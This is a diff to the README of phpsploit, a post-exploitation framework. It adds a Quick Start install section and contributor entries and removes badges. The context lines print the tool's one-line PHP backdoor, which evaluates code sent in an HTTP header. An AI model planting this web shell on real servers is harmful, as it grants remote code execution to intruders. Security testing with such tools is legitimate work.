@@ -12,8 +12,6 @@ compromised web server for **privilege escalation** purposes.
 [![codeclimate maintainability](https://api.codeclimate.com/v1/badges/6986200c1729b4a70a40/maintainability)](https://codeclimate.com/github/nil0x42/phpsploit/maintainability)
 [![license](https://img.shields.io/github/license/nil0x42/phpsploit.svg)](https://github.com/nil0x42/phpsploit/blob/master/LICENSE)
 [![requires.io requirements](https://requires.io/github/nil0x42/phpsploit/requirements.svg?branch=master)](https://requires.io/github/nil0x42/phpsploit/requirements/?branch=master)
-[![pyup.io requirements](https://pyup.io/repos/github/nil0x42/phpsploit/python-3-shield.svg)](https://pyup.io/repos/github/nil0x42/phpsploit/)
-[![sync.io vulnerabilities](https://snyk.io/test/github/nil0x42/phpsploit/badge.svg)](https://snyk.io/test/github/nil0x42/phpsploit)
 
 
 ![phpsploit demo](data/img/phpsploit-demo.png)
@@ -28,6 +26,17 @@ through a tiny **polymorphic backdoor**:
 
 ```php
 <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
+```
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+#### Quick Start
+
+```sh
+git clone https://github.com/nil0x42/phpsploit
+cd phpsploit/
+pip3 install -r requirements.txt
+./phpsploit --interactive --eval "help help"
 ```
 
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
@@ -79,8 +88,9 @@ Thanks goes to these people ([emoji key](https://github.com/all-contributors/all
 
 <!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
 <!-- prettier-ignore -->
-| [<img src="https://avatars1.githubusercontent.com/u/3504393?v=4" width="100px;" alt="nil0x42"/><br /><sub><b>nil0x42</b></sub>](https://exdemia.com)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=nil0x42 "Code") [🚇](#infra-nil0x42 "Infrastructure (Hosting, Build-Tools, etc)") [🔌](#plugin-nil0x42 "Plugin/utility libraries") [⚠️](https://github.com/nil0x42/phpsploit/commits?author=nil0x42 "Tests") | [<img src="https://avatars1.githubusercontent.com/u/20907184?v=4" width="100px;" alt="shiney-wh"/><br /><sub><b>shiney-wh</b></sub>](https://github.com/shiney-wh)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=shiney-wh "Code") [🔌](#plugin-shiney-wh "Plugin/utility libraries") | [<img src="https://avatars3.githubusercontent.com/u/1619783?v=4" width="100px;" alt="Wannes Rombouts"/><br /><sub><b>Wannes Rombouts</b></sub>](http://wapiflapi.github.io)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=wapiflapi "Code") [🚧](#maintenance-wapiflapi "Maintenance") | [<img src="https://avatars1.githubusercontent.com/u/6031769?v=4" width="100px;" alt="Amine Ben Asker"/><br /><sub><b>Amine Ben Asker</b></sub>](http://yurilz.com)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=yurilaaziz "Code") [🚧](#maintenance-yurilaaziz "Maintenance") | [<img src="https://avatars1.githubusercontent.com/u/5619153?v=4" width="100px;" alt="jose nazario"/><br /><sub><b>jose nazario</b></sub>](http://twitter.com/jnazario)<br />[📖](https://github.com/nil0x42/phpsploit/commits?author=paralax "Documentation") [🐛](https://github.com/nil0x42/phpsploit/issues?q=author%3Aparalax "Bug reports") | [<img src="https://avatars3.githubusercontent.com/u/156915?v=4" width="100px;" alt="Sujit Ghosal"/><br /><sub><b>Sujit Ghosal</b></sub>](http://wikisecure.net)<br />[📝](#blog-sujit "Blogposts") |
-| :---: | :---: | :---: | :---: | :---: | :---: |
+| [<img src="https://avatars1.githubusercontent.com/u/3504393?v=4" width="100px;" alt="nil0x42"/><br /><sub><b>nil0x42</b></sub>](https://exdemia.com)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=nil0x42 "Code") [🚇](#infra-nil0x42 "Infrastructure (Hosting, Build-Tools, etc)") [🔌](#plugin-nil0x42 "Plugin/utility libraries") [⚠️](https://github.com/nil0x42/phpsploit/commits?author=nil0x42 "Tests") | [<img src="https://avatars1.githubusercontent.com/u/20907184?v=4" width="100px;" alt="shiney-wh"/><br /><sub><b>shiney-wh</b></sub>](https://github.com/shiney-wh)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=shiney-wh "Code") [🔌](#plugin-shiney-wh "Plugin/utility libraries") | [<img src="https://avatars3.githubusercontent.com/u/1619783?v=4" width="100px;" alt="Wannes Rombouts"/><br /><sub><b>Wannes Rombouts</b></sub>](http://wapiflapi.github.io)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=wapiflapi "Code") [🚧](#maintenance-wapiflapi "Maintenance") | [<img src="https://avatars1.githubusercontent.com/u/6031769?v=4" width="100px;" alt="Amine Ben Asker"/><br /><sub><b>Amine Ben Asker</b></sub>](http://yurilz.com)<br />[💻](https://github.com/nil0x42/phpsploit/commits?author=yurilaaziz "Code") [🚧](#maintenance-yurilaaziz "Maintenance") | [<img src="https://avatars1.githubusercontent.com/u/5619153?v=4" width="100px;" alt="jose nazario"/><br /><sub><b>jose nazario</b></sub>](http://twitter.com/jnazario)<br />[📖](https://github.com/nil0x42/phpsploit/commits?author=paralax "Documentation") [🐛](https://github.com/nil0x42/phpsploit/issues?q=author%3Aparalax "Bug reports") | [<img src="https://avatars3.githubusercontent.com/u/156915?v=4" width="100px;" alt="Sujit Ghosal"/><br /><sub><b>Sujit Ghosal</b></sub>](http://wikisecure.net)<br />[📝](#blog-sujit "Blogposts") | [<img src="https://avatars3.githubusercontent.com/u/3418725?v=4" width="100px;" alt="Zerdoumi"/><br /><sub><b>Zerdoumi</b></sub>](https://github.com/sohelzerdoumi)<br />[🐛](https://github.com/nil0x42/phpsploit/issues?q=author%3Asohelzerdoumi "Bug reports") |
+| :---: | :---: | :---: | :---: | :---: | :---: | :---: |
+| [<img src="https://avatars3.githubusercontent.com/u/5489330?v=4" width="100px;" alt="tristandostaler"/><br /><sub><b>tristandostaler</b></sub>](https://github.com/tristandostaler)<br />[🐛](https://github.com/nil0x42/phpsploit/issues?q=author%3Atristandostaler "Bug reports") | [<img src="https://avatars3.githubusercontent.com/u/16543074?v=4" width="100px;" alt="Rohan Tarai"/><br /><sub><b>Rohan Tarai</b></sub>](https://github.com/rohantarai)<br />[🐛](https://github.com/nil0x42/phpsploit/issues?q=author%3Arohantarai "Bug reports") |
 <!-- ALL-CONTRIBUTORS-LIST:END -->
 
 _This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!_
